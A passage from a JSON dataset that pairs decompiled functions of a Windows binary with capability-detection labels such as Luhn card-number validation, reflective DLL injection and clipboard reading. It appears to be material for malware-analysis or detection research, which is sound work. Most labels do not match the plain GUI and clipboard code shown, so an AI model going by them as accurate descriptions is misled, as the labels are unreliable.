        "decompiled_code": "\nvoid __fastcall fcn.00428980(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint var_410h;\n    uint hgdiobj;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EAX != 0) && (*(param_1 + 0x26) < 9)) {\n        uStack1056 = 0x4289b6;\n        var_4h = param_2;\n        iVar1 = fcn.00426234();\n        if (iVar1 != 0) {\n            uStack1056 = 0;\n            uStack1060 = 0x4289c3;\n            uStack1060 = sub.user32.dll_GetDC();\n            uStack1064 = 0x4289cf;\n            var_8h = uStack1060;\n            uStack1068 = sub.gdi32.dll_CreateCompatibleDC();\n            puStack1072 = 0x4289dc;\n            hdc = uStack1068;\n            hgdiobj = sub.gdi32.dll_SelectObject();\n            uStack1076 = 0x428a2f;\n            uStack1080 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbc8;\n            uVar2 = hdc;\n            puStack1072 = &stack0xfffffffc;\n            sub.gdi32.dll_SetDIBColorTable(hdc, 0, iVar1, &fcn.00428980::var_410h);\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_SelectObject(hdc, hgdiobj, 0x428a36);\n            sub.gdi32.dll_DeleteDC(hdc);\n            sub.user32.dll_ReleaseDC(0, var_8h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "00429400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429400(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint var_58h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if (param_2 != 0) {\n        uStack104 = 0x42941e;\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uStack104 = 0x4294f3;\n            fcn.00419e30();\n            return;\n        }\n    }\n    uStack104 = 0x42942e;\n    fcn.00429bcc();\n    uStack104 = 0x497a18;\n    puStack108 = 0x429438;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack112 = 0x4294c2;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (param_2 == 0) {\n        puStack108 = &stack0xfffffffc;\n        fcn.00403af4();\n        in_stack_ffffff80 = 0;\n        fcn.00429e3c(0, 0, &fcn.00429400::var_58h);\n    }\n    else {\n        puStack108 = &stack0xfffffffc;\n        fcn.004288b4();\n        fcn.004288b8();\n        *(var_4h + 0x28) = *(param_2 + 0x28);\n        *(var_4h + 0x21) = *(param_2 + 0x21);\n        *(var_4h + 0x34) = *(param_2 + 0x34);\n        *(var_4h + 0x38) = *(param_2 + 0x38);\n    }\n    *in_FS_OFFSET = in_stack_ffffff80;\n    sub.kernel32.dll_LeaveCriticalSection(0x497a18, 0x4294c9);\n    return;\n}\n",
        "token_count": 501
    },
    "004294fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004294fc(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint var_5ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = &fcn.004294fc::var_5ch;\n    for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    puStack112 = 0x429521;\n    fcn.00429bcc();\n    var_4h = 0;\n    var_8h = 0;\n    uStack116 = 0x42958c;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    iVar1 = in_ECX;\n    if (in_ECX != *0x4979fc) {\n        puStack112 = &stack0xfffffffc;\n        iVar1 = fcn.004290ec();\n    }\n    var_8h = iVar1;\n    var_4h = fcn.00428a88(*(in_EAX + 0x2c), &fcn.004294fc::var_5ch);\n    uVar3 = 0;\n    fcn.00429e3c(0, *(*(in_EAX + 0x28) + 0x70), &fcn.004294fc::var_5ch);\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 425
    },
    "004295bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004295bc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    fcn.004298b0();\n    iVar1 = *(in_EAX + 0x28);\n    *(iVar1 + 0x50) = 0;\n    *(iVar1 + 0x54) = 0;\n    fcn.0040f934();\n    return;\n}\n",
        "token_count": 91
    },
    "004295ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.004295ec(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    arg_8h = fcn.00404620();\n    (**(*in_EAX + 0x58))();\n    uVar4 = (***arg_8h)();\n    fcn.0041b788(uVar4, uVar4 >> 0x20);\n    puVar3 = in_EAX[10] + 0x18;\n    puVar1 = &stack0xffffff98;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.00429bcc();\n    fcn.0040f934();\n    fcn.00429e3c(arg_8h, *(in_EAX[10] + 0x70), &stack0xffffff98);\n    return;\n}\n",
        "token_count": 261
    },
    "00429aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00429aa0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.004295bc();\n    iVar1 = *(in_EAX + 0x28);\n    if ((param_2 < 0) || (*(iVar1 + 0x20) <= param_2)) {\n        fcn.00425948();\n    }\n    fcn.00429b58();\n    sub.gdi32.dll_GdiFlush();\n    if (0 < *(iVar1 + 0x38)) {\n        param_2 = (*(iVar1 + 0x38) - param_2) + -1;\n    }\n    iVar2 = fcn.00425c28();\n    return iVar2 * param_2 & 0xffffffff00000000U | iVar2 * param_2 + *(iVar1 + 0x2c);\n}\n",
        "token_count": 213
    },
    "0042a4d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a4d4(int32_t param_1)\n\n{\n    int16_t aiStack112 [7];\n    uchar auStack98 [86];\n    \n    fcn.00429bcc();\n    if (param_1 == 0) {\n        fcn.00403af4();\n        fcn.00429e3c(0, 0, auStack98);\n    }\n    else {\n        fcn.0041b930();\n        if (aiStack112[0] != 0x4d42) {\n            fcn.00425978();\n        }\n        fcn.00429f64(aiStack112);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0042acfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042acfc(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY124;\n    uint uStackY120;\n    uchar *puStackY116;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_4h;\n    \n    *in_EDX = 2;\n    fcn.00429bdc();\n    puVar3 = *(in_EAX + 0x28) + 0x18;\n    puVar4 = &fcn.0042acfc::var_58h;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h = 0;\n    var_44h = 0;\n    puStackY116 = 0x42ad49;\n    uVar1 = fcn.00428a88(*(in_EAX + 0x2c), &fcn.0042acfc::var_58h);\n    *var_4h = uVar1;\n    uStackY120 = 0x42ad76;\n    uStackY124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStackY116 = &stack0xfffffffc;\n    uVar1 = fcn.004290ec();\n    *arg_8h = uVar1;\n    *in_FS_OFFSET = uStackY124;\n    return;\n}\n",
        "token_count": 405
    },
    "0042ae48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ae48(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00426c34();\n    *(in_EAX + 0x21) = 1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x28) = uVar1;\n    fcn.004288b4();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 191
    },
    "0042b0f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042b0f0(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    puStack32 = 0x42b109;\n    piVar1 = fcn.00404620();\n    uStack36 = 0x42b17e;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar2 = (***param_2)();\n    fcn.0041b704(uVar2);\n    (**(*piVar1 + 4))();\n    (***piVar1)();\n    fcn.0041b930();\n    fcn.0041b930();\n    if (1 < var_ah._2_2_) {\n        fcn.00425984();\n    }\n    fcn.0042b1a8();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42b19e;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 304
    },
    "0042b21c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b21c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint lpvObject;\n    uint var_2ch;\n    uint piconinfo;\n    uint var_ch;\n    uint hgdiobj;\n    int32_t *var_4h;\n    \n    puStack60 = 0x42b234;\n    var_4h = in_EAX;\n    fcn.0042b1a8();\n    if (param_2 != 0) {\n        puStack60 = &fcn.0042b21c::piconinfo;\n        puStack68 = 0x42b242;\n        iStack64 = param_2;\n        iVar1 = sub.user32.dll_GetIconInfo();\n        if (iVar1 != 0) {\n            uStack72 = 0x42b299;\n            uStack76 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffb4;\n            uVar2 = hgdiobj;\n            puStack68 = &stack0xfffffffc;\n            iVar1 = sub.gdi32.dll_GetObjectA(hgdiobj, 0x18, &fcn.0042b21c::lpvObject);\n            if (iVar1 != 0) {\n                iVar1 = var_4h[10];\n                *(iVar1 + 0x10) = var_2ch;\n                *(iVar1 + 0x14) = var_2ch;\n            }\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_DeleteObject(var_ch, 0x42b2a0);\n            sub.gdi32.dll_DeleteObject(hgdiobj);\n            return;\n        }\n    }\n    puStack68 = 0x42b2ab;\n    (**(*var_4h + 0x10))();\n    return;\n}\n",
        "token_count": 460
    },
    "0042b3b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.0042b3b8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack32;\n    \n    uVar3 = 1;\n    uStack68 = 0;\n    uStack72 = 0x42b3c6;\n    iVar1 = sub.user32.dll_GetDC();\n    if (iVar1 != 0) {\n        uStack72 = *0x497a10;\n        iStack76 = iVar1;\n        iVar2 = sub.gdi32.dll_SelectObject();\n        if (iVar2 != 0) {\n            iVar2 = sub.gdi32.dll_GetTextMetricsA(iVar1, &stack0xffffffb4);\n            if (iVar2 != 0) {\n                uVar3 = uStack32;\n            }\n        }\n        sub.user32.dll_ReleaseDC(0, iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 223
    },
    "0042b5d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042b5d8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 134
    },
    "0042b63c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b63c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "0042b648": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b648(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "0042b808": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b808(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(in_EAX + 4);\n    if (puVar1 == NULL) {\n        return;\n    }\n    uStack28 = 0x42b826;\n    fcn.0042b63c();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 4) = *puVar1;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x42b85c;\n    uStack32 = 0x42b854;\n    fcn.0042b648();\n    return;\n}\n",
        "token_count": 207
    },
    "0042bb28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042bb28(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    fcn.00405584();\n    puVar1 = fcn.0040a508();\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if ((iVar2 < 1) || ((0x20 < *puVar1 && (*puVar1 != 0x2e)))) break;\n        fcn.004059dc();\n        fcn.00405c6c();\n        puVar1 = fcn.0040a508();\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0042bc4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bc4c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack40 = 0x42bc60;\n        fcn.00404974();\n    }\n    uStack44 = 0x42bcbe;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0042bb28();\n    fcn.0042bb78(arg_8h, arg_14h);\n    fcn.00405584();\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h;\n    uStack48 = 0x42bcc5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 230
    },
    "0042bdc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042bdc4(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_8h;\n    uint rclsid;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    uStack52 = 0x42bea4;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    uStack64 = 0x42be1f;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    uVar1 = fcn.0040700c();\n    uVar2 = 0x42beb4;\n    sub.ole32.dll_CoCreateInstance(in_EAX, 0, 5, 0x42beb4, uVar1);\n    fcn.0042bd00();\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = uVar2;\n    uStack68 = 0x42beab;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 304
    },
    "0042c09c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042c09c(void)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_18h;\n    uint rclsid;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack72 = &stack0xfffffffc;\n    uStack64 = 0x42c171;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    uStack76 = 0x42c0ff;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack80;\n    fcn.0042bd3c();\n    uVar1 = fcn.0040700c();\n    iVar3 = 0x42c180;\n    puVar2 = &rclsid;\n    sub.ole32.dll_CoCreateInstance(puVar2, 0, 5, 0x42c180, uVar1);\n    fcn.0042bd00();\n    *in_FS_OFFSET = puVar2;\n    *in_FS_OFFSET = iVar3;\n    iStack80 = 0x42c178;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 322
    },
    "0042c6ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042c6ec(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(arg_8h + -4);\n    var_4h._0_1_ = 6;\n    fcn.0040dbe4(0, &var_8h);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 105
    },
    "0042cd40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042cd40(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "0042d3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d3f0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x42d490;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = fcn.0042d2d0();\n    *(iVar2 + 8) = *(in_EAX + 0x18);\n    fcn.00419730();\n    (**(*param_2 + 0x24))();\n    fcn.0040700c();\n    cVar1 = fcn.0040f944();\n    if (cVar1 != '\\0') {\n        fcn.00419730();\n    }\n    *(in_EAX + 0x18) = *(in_EAX + 0x18) + 1;\n    fcn.00407050();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42d497;\n    uStack32 = 0x42d48f;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 313
    },
    "0042d2d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042d2d0(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    fcn.00407024();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 138
    },
    "0042d314": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042d314(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x10) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x14) = uVar1;\n    fcn.00405530();\n    *(in_EAX + 0x18) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 217
    },
    "0042edbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042edbc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 140
    },
    "00430f38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430f38(uint param_1, code *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x430f53;\n    fcn.00447b54();\n    puStack40 = 0x430f5d;\n    fcn.0043b890();\n    puStack40 = 0x430f65;\n    fcn.0043b6ec();\n    uStack44 = 0x430fe1;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x430fa8;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *0x490330 = in_EAX;\n    puStack40 = &stack0xfffffffc;\n    (*param_2)();\n    *in_FS_OFFSET = param_1;\n    return;\n}\n",
        "token_count": 296
    },
    "004310c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004310c0(void)\n\n{\n    uint uVar1;\n    \n    *0x497bb8 = sub.user32.dll_RegisterWindowMessageA(0x431124);\n    *0x497bbc = sub.user32.dll_RegisterWindowMessageA(0x431134);\n    uVar1 = 1;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    uVar1 = fcn.0040af08(uVar1);\n    *0x490334 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    return;\n}\n",
        "token_count": 120
    },
    "00431410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write clipboard data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431410(uint dwBytes)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t in_EDX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hMem;\n    uint var_4h;\n    \n    puStack28 = 0x43142b;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x4314e2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = dwBytes;\n    uStack44 = 0x2002;\n    puStack48 = 0x431444;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_GlobalAlloc();\n    uStack52 = 0x4314b4;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack64 = 0x43145e;\n    uStack60 = uVar1;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_GlobalLock();\n    uStack68 = 0x4314a3;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.004030fc();\n    fcn.0043134c();\n    uVar2 = in_EDX & 0xffff;\n    sub.user32.dll_SetClipboardData(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    uStack72 = 0x4314aa;\n    sub.kernel32.dll_GlobalUnlock(uVar1);\n    return;\n}\n",
        "token_count": 468
    },
    "004315a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.004315a0(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t *in_EAX;\n    uint arg_8h;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4315b7;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x431648;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while( true ) {\n        if (uVar2 == 0) {\n            fcn.0040dba8();\n            fcn.00404ec4();\n            *in_FS_OFFSET = uStack40;\n            uStack32 = 0x43164f;\n            uStack36 = 0x431647;\n            (**(*in_EAX + 0x14))();\n            return;\n        }\n        cVar1 = fcn.00427480();\n        if (cVar1 != '\\0') break;\n        uStack40 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    sub.user32.dll_GetClipboardData(uVar2);\n    arg_8h = sub.user32.dll_GetClipboardData(9);\n    fcn.00427390(arg_8h);\n    fcn.00404f70();\n    return;\n}\n",
        "token_count": 375
    },
    "004318e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
